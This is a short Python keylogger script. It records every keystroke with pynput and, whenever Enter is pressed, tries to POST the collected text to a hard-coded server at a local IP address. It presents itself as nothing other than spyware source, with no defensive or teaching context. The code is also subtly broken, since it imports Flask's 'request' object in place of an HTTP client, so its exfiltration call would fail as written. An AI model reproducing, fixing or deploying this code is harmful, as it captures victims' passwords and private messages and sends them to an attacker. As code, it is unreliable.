from flask.globals import request
from pynput.keyboard import Listener ,Key

server_url = 'http://192.168.35.164:5000/get_logs'
logs = ''
def on_press(key):
    global logs

    if key == Key.enter:
        try:
            request.post(server_url,data={'logs': logs})
        except:
            print('Server error')
        logs = ''
    else:
        logs += str(key).replace("'","")
    print(key)

with Listener(on_press=on_press) as listener:
    listener.join()
